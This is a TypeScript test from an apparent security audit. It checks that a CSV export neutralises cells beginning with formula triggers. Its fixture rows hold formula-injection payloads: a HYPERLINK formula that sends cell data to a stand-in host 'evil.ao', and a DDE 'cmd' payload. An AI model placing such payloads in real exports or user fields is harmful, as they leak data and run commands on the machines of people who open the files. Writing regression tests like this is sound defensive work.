// AUDIT PoC — H3 (ALTO): CSV/Formula injection in the table export. `csvField`
// applies RFC-4180 quoting but never neutralises cells that START with a formula
// trigger (= + - @ TAB CR). Excel/Sheets evaluate "=…" even when quoted, so a
// stored user value like =HYPERLINK(...) runs when the operator opens the export.
// This asserts the SAFE behaviour (triggers neutralised); it fails pre-fix.
import { test } from "node:test";
import assert from "node:assert/strict";
import { toCsv, type ExportColumn } from "../src/export.ts";

interface Row {
  name: string;
}

test("H3: CSV export neutralises formula triggers (= + - @ TAB CR)", () => {
  const cols: ExportColumn<Row>[] = [{ key: "name", label: "Name", value: (r) => r.name }];
  const rows: Row[] = [
    { name: '=HYPERLINK("https://evil.ao/x?d="&A1,"Reconciliação")' },
    { name: "+1+1" },
    { name: "-2+3" },
    { name: "@SUM(A1:A9)" },
    { name: "\t=cmd|'/c calc'!A1" },
  ];

  const csv = toCsv(rows, cols);
  const dataLines = csv.split("\r\n").slice(1); // drop the header row

  for (const line of dataLines) {
    // Unwrap one layer of RFC-4180 quoting so we inspect the real first char.
    const cell = line.startsWith('"') ? line.slice(1) : line;
    assert.ok(
      !/^[=+\-@\t\r]/.test(cell),
      `cell must not start with a formula trigger — got line: ${JSON.stringify(line)}`,
    );
  }
});

test("H3: ordinary values are left intact (no spurious prefixing)", () => {
  const cols: ExportColumn<Row>[] = [{ key: "name", label: "Name", value: (r) => r.name }];
  const csv = toCsv([{ name: "Ngola Lda" }, { name: "42 units" }], cols);
  assert.equal(csv, "Name\r\nNgola Lda\r\n42 units");
});
